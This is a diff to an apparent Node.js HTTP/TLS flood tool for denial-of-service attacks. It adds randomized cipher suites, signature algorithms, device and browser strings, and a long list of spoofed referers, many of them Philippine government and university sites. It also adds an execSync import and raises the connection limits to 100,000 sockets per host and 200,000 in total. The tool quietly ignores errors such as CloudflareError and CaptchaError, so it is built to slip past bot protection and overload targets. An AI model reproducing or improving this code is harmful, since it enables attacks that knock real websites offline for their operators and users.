@@ -6,6 +6,7 @@ tls = require('tls'),
 net = require('net'),
 request = require('request'),
 cluster = require('cluster')
+const { execSync } = require('child_process');
 
 const crypto = require('crypto');
 const currentTime = new Date();
@@ -87,8 +88,6 @@ const type = [
 ];
 
 
-
-
 const platform = [
   "Windows",
   "Windows Phone",
@@ -96,6 +95,7 @@ const platform = [
   "Linux",
   "iOS",
   "Android",
+  "Iphone",
   "PlayStation 4",
   "Xbox One",
   "Nintendo Switch",
@@ -106,7 +106,9 @@ const platform = [
   "Smart TV",
   "Other"
 ];
-cplist = [
+
+const cplist = [
+  'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384',
   "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
   "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
   "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
@@ -408,7 +410,7 @@ const fetch_dest = [
   "unknown",
   "worker",
 ];
-encoding_header = [
+const encoding_header = [
 'gzip, deflate, br',
 'compress, gzip',
 'deflate, gzip',
@@ -417,6 +419,7 @@ encoding_header = [
 ];
 const sigalgs = [
       'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
+      'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256',
       'ecdsa_brainpoolP256r1tls13_sha256',
       'ecdsa_brainpoolP384r1tls13_sha384',
       'ecdsa_brainpoolP512r1tls13_sha512',
@@ -436,13 +439,231 @@ const sigalgs = [
       'rsa_pss_pss_sha512',
       'sm2sig_sm3',
       'ecdsa_secp521r1_sha512',
+      'ecdsa_secp256r1_sha256',
+      'rsa_pss_rsae_sha256',
+      'rsa_pkcs1_sha256',
+      'ecdsa_secp384r1_sha384',
+      'rsa_pss_rsae_sha384',
+      'rsa_pkcs1_sha384',
+      'rsa_pss_rsae_sha512',
+      'rsa_pkcs1_sha512',
+      'ecdsa_secp256r1_sha256',
+      'ecdsa_secp384r1_sha384',
+      'ecdsa_secp521r1_sha512',
+      'rsa_pss_rsae_sha256',
+      'rsa_pss_rsae_sha512',
+      'rsa_pkcs1_sha256',
+      'rsa_pkcs1_sha384',
+      'rsa_pkcs1_sha512',
   ];
   let concu = sigalgs.join(':');
 
-controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400'],
+const controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400'],
 ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'],
 
 ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET',  'ENETUNREACH',  'ENONET',  'ENOTCONN',  'ENOTFOUND',  'EAI_NODATA',  'EAI_NONAME',  'EADDRNOTAVAIL',  'EAFNOSUPPORT',  'EALREADY',  'EBADF',  'ECONNABORTED',  'EDESTADDRREQ',  'EDQUOT',  'EFAULT',  'EHOSTUNREACH',  'EIDRM',  'EILSEQ',  'EINPROGRESS',  'EINTR',  'EINVAL',  'EIO',  'EISCONN',  'EMFILE',  'EMLINK',  'EMSGSIZE',  'ENAMETOOLONG',  'ENETDOWN',  'ENOBUFS',  'ENODEV',  'ENOENT',  'ENOMEM',  'ENOPROTOOPT',  'ENOSPC',  'ENOSYS',  'ENOTDIR',  'ENOTEMPTY',  'ENOTSOCK',  'EOPNOTSUPP',  'EPERM',  'EPIPE',  'EPROTONOSUPPORT',  'ERANGE',  'EROFS',  'ESHUTDOWN',  'ESPIPE',  'ESRCH',  'ETIME',  'ETXTBSY',  'EXDEV',  'UNKNOWN',  'DEPTH_ZERO_SELF_SIGNED_CERT',  'UNABLE_TO_VERIFY_LEAF_SIGNATURE',  'CERT_HAS_EXPIRED',  'CERT_NOT_YET_VALID'];
+
+const referer = [
+  "https://www.google.com/",
+  "https://www.facebook.com/",
+  "https://www.youtube.com/",
+  "https://www.twitter.com/",
+  "https://www.instagram.com/",
+  "https://www.amazon.com/",
+  "https://www.reddit.com/",
+  "https://www.linkedin.com/",
+  "https://www.tiktok.com/",
+  "https://www.whatsapp.com/",
+  "https://www.telegram.org/",
+  "https://www.discord.com/",
+  "https://www.bing.com/",
+  "https://www.yahoo.com/",
+  "https://www.baidu.com/",
+  "https://www.duckduckgo.com/",
+  "https://cloudflare.com/",
+  "https://www.apple.com/",
+  "https://www.microsoft.com/",
+  "https://github.com/",
+  "https://stackoverflow.com/",
+  "https://news.ycombinator.com/",
+  "https://www.quora.com/",
+  "https://www.pinterest.com/",
+  "https://www.snapchat.com/",
+  "https://www.twitch.tv/",
+  "https://www.netflix.com/",
+  "https://www.spotify.com/",
+  "https://www.ebay.com/",
+  "https://www.paypal.com/",
+  "https://www.cnn.com/",
+  "https://www.bbc.com/",
+  "https://www.nytimes.com/",
+  "https://www.wikipedia.org/",
+  "https://www.imdb.com/",
+  "https://www.espn.com/",
+  "https://www.weather.com/",
+  "https://www.forbes.com/",
+  "https://www.gov.ph/",
+  "https://dfa.gov.ph/",
+  "https://doh.gov.ph/",
+  "https://deped.gov.ph/",
+  "https://bir.gov.ph/",
+  "https://lto.gov.ph/",
+  "https://psa.gov.ph/",
+  "https://pnp.gov.ph/",
+  "https://comelec.gov.ph/",
+  "https://dilg.gov.ph/",
+  "https://dost.gov.ph/",
+  "https://dot.gov.ph/",
+  "https://dti.gov.ph/",
+  "https://sss.gov.ph/",
+  "https://www.psai.ph/",
+  "https://pagibig.gov.ph/",
+  "https://philhealth.gov.ph/",
+  "https://www.rappler.com/",
+  "https://www.philstar.com/",
+  "https://www.gmanetwork.com/news/",
+  "https://news.abs-cbn.com/",
+  "https://www.inquirer.net/",
+  "https://www.manilatimes.net/",
+  "https://mb.com.ph/",
+  "https://www.sunstar.com.ph/",
+  "https://www.pna.gov.ph/",
+  "https://cnnphilippines.com/",
+  "https://tribune.net.ph/",
+  "https://www.bworldonline.com/",
+  "https://www.manilabulletin.com/",
+  "https://www.untvweb.com/news/",
+  "https://ptvnews.ph/",
+  "https://foi.gov.ph/",
+  "https://dbm.gov.ph/",
+  "https://denr.gov.ph/",
+  "https://doj.gov.ph/",
+  "https://dswd.gov.ph/",
+  "https://darf.gov.ph/",
+  "https://dap.edu.ph/",
+  "https://dnd.gov.ph/",
+  "https://doe.gov.ph/",
+  "https://dole.gov.ph/",
+  "https://dpwh.gov.ph/",
+  "https://dost.gov.ph/",
+  "https://dotr.gov.ph/",
+  "https://dap.edu.ph/",
+  "https://boi.gov.ph/",
+  "https://bfar.da.gov.ph/",
+  "https://blgf.gov.ph/",
+  "https://boq.gov.ph/",
+  "https://bsp.gov.ph/",
+  "https://cbk.gov.ph/",
+  "https://cda.gov.ph/",
+  "https://ched.gov.ph/",
+  "https://civilservice.gov.ph/",
+  "https://coa.gov.ph/",
+  "https://comstech.gov.ph/",
+  "https://cpbrd.gov.ph/",
+  "https://da.gov.ph/",
+  "https://dap.edu.ph/",
+  "https://dbm.gov.ph/",
+  "https://dcs.gov.ph/",
+  "https://denr.gov.ph/",
+  "https://deped.gov.ph/",
+  "https://dfa.gov.ph/",
+  "https://dilg.gov.ph/",
+  "https://diwa.gov.ph/",
+  "https://doe.gov.ph/",
+  "https://dof.gov.ph/",
+  "https://doh.gov.ph/",
+  "https://doj.gov.ph/",
+  "https://dole.gov.ph/",
+  "https://dot.gov.ph/",
+  "https://dotr.gov.ph/",
+  "https://dost.gov.ph/",
+  "https://dswd.gov.ph/",
+  "https://dtI.gov.ph/",
+  "https://dti.gov.ph/",
+  "https://finance.gov.ph/",
+  "https://www.up.edu.ph/",
+  "https://www.ust.edu.ph/",
+  "https://www.dlsu.edu.ph/",
+  "https://www.ateneo.edu/",
+  "https://www.mapua.edu.ph/",
+  "https://www.slu.edu.ph/",
+  "https://www.usc.edu.ph/",
+  "https://www.admu.edu.ph/",
+  "https://www.feutech.edu.ph/",
+  "https://www.ama.edu.ph/",
+  "https://www.nu.edu.ph/",
+  "https://www.auf.edu.ph/",
+  "https://www.mcl.edu.ph/",
+  "https://www.letran.edu.ph/",
+  "https://www.sbc.edu.ph/",
+  "https://www.ub.edu.ph/",
+  "https://www.ue.edu.ph/",
+  "https://www.pup.edu.ph/",
+  "https://www.plm.edu.ph/",
+  "https://www.umak.edu.ph/",
+  "https://www.tup.edu.ph/",
+  "https://www.pnu.edu.ph/",
+  "https://www.bulsu.edu.ph/",
+  "https://www.cvsu.edu.ph/",
+  "https://www.msumain.edu.ph/",
+  "https://www.usc.edu.ph/",
+  "https://www.wvsu.edu.ph/",
+  "https://www.psu.edu.ph/",
+  "https://www.spu.edu.ph/",
+  "https://www.xu.edu.ph/",
+  "https://www.addu.edu.ph/",
+  "https://www.mseuf.edu.ph/",
+  "https://www.usa.edu.ph/",
+  "https://www.um.edu.ph/",
+  "https://www.ndmu.edu.ph/",
+  "https://www.mcu.edu.ph/",
+  "https://www.ceu.edu.ph/",
+  "https://www.rtu.edu.ph/",
+  "https://www.auf.edu.ph/",
+  "https://www.usa.edu.ph/",
+  "https://www.umak.edu.ph/",
+  "https://www.ust.edu.ph/",
+  "https://www.dmmmsu.edu.ph/",
+  "https://www.csc.edu.ph/",
+  "https://www.msuiit.edu.ph/",
+  "https://www.cmu.edu.ph/",
+  "https://www.usep.edu.ph/",
+  "https://www.urc.edu.ph/",
+  "https://www.umindanao.edu.ph/",
+  "https://www.umindanao.edu.ph/",
+  "https://www.cit.edu.ph/",
+  "https://www.malayan.edu.ph/",
+  "https://www.dbtc.edu.ph/",
+  "https://www.dbts.edu.ph/",
+  "https://www.donboscocanlubang.edu.ph/",
+  "https://www.donboscomanila.edu.ph/",
+  "https://www.donboscocalamba.edu.ph/",
+  "https://www.donboscomakati.edu.ph/",
+  "https://www.donboscobatangas.edu.ph/",
+  "https://www.donboscotarlac.edu.ph/",
+  "https://www.donbosco.pampanga.edu.ph/",
+  "https://www.donboscocavite.edu.ph/",
+  "https://www.donboscolegazpi.edu.ph/",
+  "https://www.donboscodumaguete.edu.ph/",
+  "https://www.donboscobacolod.edu.ph/",
+  "https://www.donboscoiloilo.edu.ph/",
+  "https://www.donboscocebu.edu.ph/",
+  "https://www.donboscodavao.edu.ph/",
+  "https://www.donboscocds.edu.ph/",
+  "https://www.donboscotarlac.edu.ph/",
+  "https://www.donboscomandaluyong.edu.ph/",
+  "https://www.donboscosavio.edu.ph/",
+  "https://www.donboscotech.edu.ph/",
+  "https://www.donboscocollege.edu.ph/",
+  "https://www.donboscopampanga.edu.ph/",
+  "https://www.donbosco.edu.ph/",
+  "https://www.dbtc.edu.ph/",
+  "https://www.dbts.edu.ph/",
+  "https://www.donboscotechnicalcollege.edu.ph/",
+  "https://www.donboscovocational.edu.ph/",
+  "https://www.donboscotrainingcenter.edu.ph/",
+  "https://www.donboscoyouthcenter.edu.ph/"
+];
 
 const headerFunc = {
   accept() {
@@ -726,10 +947,10 @@ switch (randomIndex) {
     'iOS': ['8_1', '8_3', '8_4', '9_0', '9_1', '9_2', '9_3', '10_0', '10_1', '10_2', '10_3', '11_0', '11_1', '11_2', '11_3', '11_4', '12_0', '12_1', '12_2', '12_3', '12_4', '13_0', '13_1', '13_2', '13_3', '13_4', '14_0', '14_1', '14_2', '14_3', '14_4'],
   };
   const chromeVersions = ['141.0.7390.108', '141.0.7390.123', '138.0.7204.251', '80.0.3987.149', '81.0.4044.138', '83.0.4103.97', '85.0.4183.102', '87.0.4280.88', '88.0.4324.150', '89.0.4389.82', '90.0.4430.93', '91.0.4472.124', '92.0.4515.107', '93.0.4577.63'];
-  const safariVersions = ['534.30', '537.36', '538.1', '602.1', '604.1', '605.1.15', '606.1.36', '607.1.39'];
+  const safariVersions = ['534.30', '537.36', '538.1', '602.1', '604.1', '605.1.15', '606.1.36', '607.1.39', '618.1.25', '619.1.30', '620.1.35', '621.1.40'];
   const androidVersions = ['15.0', '11.0', '10.0', '9.0', '8.0', '7.0', '6.0', '5.1', '5.0', '4.4', '4.3', '4.2', '4.1', '4.0'];
   const iosVersions = ['15.0', '14.8', '14.7', '14.6', '14.5', '14.4', '14.3', '14.2', '14.1', '14.0', '13.7', '13.6', '13.5', '13.4', '13.3', '13.2', '13.1', '13.0', '12.4', '12.3', '12.2', '12.1', '12.0', '11.4', '11.3', '11.2', '11.1', '11.0', '10.3', '10.2', '10.1', '10.0', '9.3', '9.2', '9.1', '9.0', '8.4', '8.3', '8.2', '8.1', '8.0'];
-  const devices = ['iPhone', 'iPad', 'iPod', 'Android', 'Samsung', 'Huawei', 'Redmi', 'HTC', 'Nokia', 'Sony', 'LG', 'Motorola', 'Google'];
+  const devices = ['iPhone', 'SM-G991B', 'iPhone14,3', 'Pixel 6', 'Mi 11 Lite', 'iPad', 'iPod', 'Android', 'Samsung', 'Huawei', 'Redmi', 'HTC', 'Nokia', 'Sony', 'LG', 'Motorola', 'Google'];
   
   const osNames = Object.keys(osVersions);
   const osName = osNames[getRandomInt(0, osNames.length - 1)];
@@ -799,9 +1020,9 @@ var header = {
 
 const agent = new http.Agent({
   keepAlive: true,
-  keepAliveMsecs: 400000,
-  maxSockets: 70000,
-  maxTotalSockets: 12000,
+  keepAliveMsecs: 1000,
+  maxSockets: 100000,
+  maxTotalSockets: 200000,
 });
 
 const requestOptions = {
@@ -895,6 +1116,4 @@ req.on('connect', function (res, socket, head) {
     }
 
 
-const client = http2.connect(parsed.href, clientOptions, function() {
-  // handle successful connection
-});
+
